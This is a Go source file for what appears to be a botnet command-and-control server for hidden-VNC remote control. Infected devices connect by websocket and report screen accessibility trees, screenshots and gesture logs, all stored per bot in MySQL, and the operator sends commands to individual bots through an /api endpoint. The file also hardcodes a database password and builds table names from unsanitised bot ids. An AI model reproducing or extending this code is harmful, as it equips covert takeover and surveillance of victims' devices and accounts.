package main

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"os"
	"sync"
	"time"

	_ "github.com/go-sql-driver/mysql"
	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
)

type ConnectionInfo struct {
	mu          sync.Mutex
	Conn        *websocket.Conn
	ID          string
	Data        string
	Image       string
	LastConnect time.Time
	Status      string
}

type Image struct {
	ID    string `json:"bot"`
	Image string `json:"image"`
}

var connectionMap sync.Map

var (
	connectionLog io.Writer
)

var db *sql.DB

func main() {
	var err error
	db, err = sql.Open("mysql", "phoniex:..sqlvnc..@tcp(localhost:3306)/bot")
	if err != nil {
		log.Fatal(err)
	}
	defer db.Close()

	err = db.Ping()
	if err != nil {
		log.Fatal(err)
	}

	file, err := os.OpenFile("log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
	if err != nil {
		log.Fatal(err)
	}
	connectionLog = io.MultiWriter(file, os.Stdout)
	log.SetOutput(connectionLog)

	r := mux.NewRouter()

	r.Use(middlewareRecover)

	r.HandleFunc("/ws", wsHandler)
	r.HandleFunc("/get/{id}", getDataHandler)
	r.HandleFunc("/image", imageHandler).Methods("POST")
	r.HandleFunc("/gesture", gesturesHandler).Methods("POST")
	r.HandleFunc("/api", treeHandler).Methods("POST")
	r.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) { fmt.Fprintf(w, "OK") })

	err = http.ListenAndServe(":9000", r)
	if err != nil {
		log.Fatal("ListenAndServe: ", err)
	}

}

func gesturesHandler(w http.ResponseWriter, r *http.Request) {
	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Error reading request body", http.StatusInternalServerError)
		return
	}

	var img Image
	err = json.Unmarshal(body, &img)
	if err != nil {
		http.Error(w, "Error unmarshaling JSON", http.StatusBadRequest)
		return
	}

	var msg map[string]string
	err = json.Unmarshal(body, &msg)
	if err != nil {
		log.Println(err)
	}

	idbot := msg["id"]
	time := msg["date"]
	gesture := msg["gesture"]
	texts := msg["text"]
	Type := msg["type"]

	stmt, err := db.Prepare(`CREATE TABLE IF NOT EXISTS gestures_` + idbot + ` (
		id INT AUTO_INCREMENT,
		uuid CHAR(36) UNIQUE,
		gesture LONGTEXT,
		date VARCHAR(255),
		text VARCHAR(255),
		type VARCHAR(255),
		PRIMARY KEY (id)
	);`)
	if err != nil {
		log.Fatal(err)
	}

	_, err = stmt.Exec()
	if err != nil {
		log.Fatal(err)
	}

	stmt, err = db.Prepare("INSERT INTO gestures_" + idbot + "(uuid, gesture, date, text, type) VALUES(?, ?, ?, ?, ?)")
	if err != nil {
		log.Fatal(err)
	}

	res, err := stmt.Exec(randomString(16), gesture, time, texts, Type)
	if err != nil {
		log.Fatal(err)
	}

	id, err := res.LastInsertId()
	if err != nil {
		log.Fatal(err)
		log.Fatal(id)
	}

}

func randomString(length int) string {
	charset := "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.New(rand.NewSource(time.Now().UnixNano())).Intn(len(charset))]
	}
	return string(b)
}

func middlewareRecover(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		defer func() {
			if err := recover(); err != nil {
				log.Println("Recovered from panic: ", err)
				http.Error(w, "Internal server error", http.StatusInternalServerError)
			}
		}()
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "*")
		w.Header().Set("Access-Control-Allow-Headers", "*")

		next.ServeHTTP(w, r)
	})
}

func wsHandler(w http.ResponseWriter, r *http.Request) {
	var upgrader = websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool {
			return true
		},
	}

	ws, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Println(err)
		http.Error(w, "Failed to upgrade connection", http.StatusBadRequest)
		return
	}
	defer ws.Close()

	var msg map[string]string
	id := ""
	for id == "" {
		_, p, err := ws.ReadMessage()
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				log.Printf("websocket closed: %v", err)
			}
			return
		}
		err = json.Unmarshal(p, &msg)
		if err != nil {
			log.Println(err)
			continue
		}

		id = msg["id"]
	}

	connectionMap.Store(id, &ConnectionInfo{
		Conn:        ws,
		ID:          id,
		LastConnect: time.Now(),
		Status:      "hvnc_off",
	})

	log.Println("[+] New connection:", id)

	defer connectionMap.Delete(id)
	defer log.Println("[-] Connection closed: ", id)

	for {
		_, p, err := ws.ReadMessage()
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				log.Printf("websocket closed: %v", err)
			}
			return
		}

		data := string(p)
		val, ok := connectionMap.Load(id)
		if ok {
			connInfo := val.(*ConnectionInfo)
			connInfo.mu.Lock()
			connInfo.Data = data
			connInfo.LastConnect = time.Now()
			if data == "" || data == "hvnc_off" {
				connInfo.Status = "hvnc_off"
			} else {
				connInfo.Status = "on"
			}
			connInfo.mu.Unlock()
		}
	}
}

func getDataHandler(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	id := vars["id"]

	val, ok := connectionMap.Load(id)
	if !ok {
		http.Error(w, "No such connection", http.StatusNotFound)
		return
	}

	connInfo := val.(*ConnectionInfo)
	connInfo.mu.Lock()
	if connInfo.Status == "hvnc_off" {
		connInfo.mu.Unlock()
		fmt.Fprint(w, "hvnc_off")
		return
	}

	data := map[string]interface{}{}
	err := json.Unmarshal([]byte(connInfo.Data), &data)
	connInfo.mu.Unlock()
	if err != nil {
		http.Error(w, "Error parsing connection data", http.StatusInternalServerError)
		return
	}

	renameMap := map[string]string{
		"height":         "h",
		"width":          "w",
		"image":          "img",
		"vnc":            "v",
		"boundsInScreen": "s",
		"left":           "l",
		"right":          "r",
		"top":            "t",
		"bottom":         "b",
		"centerx":        "x",
		"centery":        "y",
		"text":           "tx",
		"description":    "d",
		"child":          "c",
		"level":          "lv",
		"blackscreen":    "bl",
		"screen":         "sc",
		"clickable":      "cl",
		"editable":       "e",
		"longclickable":  "lc",
		"info":           "i",
	}

	RenameVariables(data, renameMap)

	monday, ok := data["v"].(bool)
	if ok && monday && connInfo.Image != "" {
		data["img"] = connInfo.Image
	}

	data["ls"] = connInfo.LastConnect.Format("02-01-2006 15:04:05")

	response, err := json.Marshal(data)
	if err != nil {
		http.Error(w, "Error generating response", http.StatusInternalServerError)
		return
	}

	fmt.Fprint(w, string(response))
}

func RenameVariables(data interface{}, renames map[string]string) {
	switch value := data.(type) {
	case map[string]interface{}:
		RenameMapVariables(value, renames)
	case []interface{}:
		RenameArrayVariables(value, renames)
	}
}

func RenameMapVariables(data map[string]interface{}, renames map[string]string) {
	for key, value := range data {
		if newKey, ok := renames[key]; ok {
			data[newKey] = value
			delete(data, key)
		}

		RenameVariables(value, renames)
	}
}

func RenameArrayVariables(data []interface{}, renames map[string]string) {
	for _, value := range data {
		RenameVariables(value, renames)
	}
}

func imageHandler(w http.ResponseWriter, r *http.Request) {
	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Error reading request body", http.StatusInternalServerError)
		return
	}

	var img Image
	err = json.Unmarshal(body, &img)
	if err != nil {
		http.Error(w, "Error unmarshaling JSON", http.StatusBadRequest)
		return
	}

	val, ok := connectionMap.Load(img.ID)
	if !ok {
		http.Error(w, "ID not found", http.StatusNotFound)
		return
	}

	connInfo := val.(*ConnectionInfo)
	connInfo.mu.Lock()
	connInfo.Image = img.Image
	connInfo.mu.Unlock()

	fmt.Fprintf(w, "Image updated for connection %s", img.ID)
}

func treeHandler(w http.ResponseWriter, r *http.Request) {
	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Error reading request body", http.StatusInternalServerError)
		return
	}

	var reqBody map[string]interface{}
	err = json.Unmarshal(body, &reqBody)
	if err != nil {
		http.Error(w, "Error unmarshaling JSON", http.StatusBadRequest)
		return
	}

	id, ok := reqBody["id"].(string)
	if !ok {
		http.Error(w, "ID not provided", http.StatusBadRequest)
		return
	}

	val, ok := connectionMap.Load(id)
	if !ok {
		http.Error(w, "No such connection", http.StatusNotFound)
		return
	}

	connInfo := val.(*ConnectionInfo)
	connInfo.mu.Lock()
	err = connInfo.Conn.WriteMessage(websocket.TextMessage, body)
	connInfo.mu.Unlock()
	if err != nil {
		http.Error(w, "Failed to send message", http.StatusInternalServerError)
		return
	}

	//log.Println(fmt.Sprintf("Command sent to connection %s: %s\n", id, string(body)))

	fmt.Fprintf(w, "Message sent to connection %s", id)
}

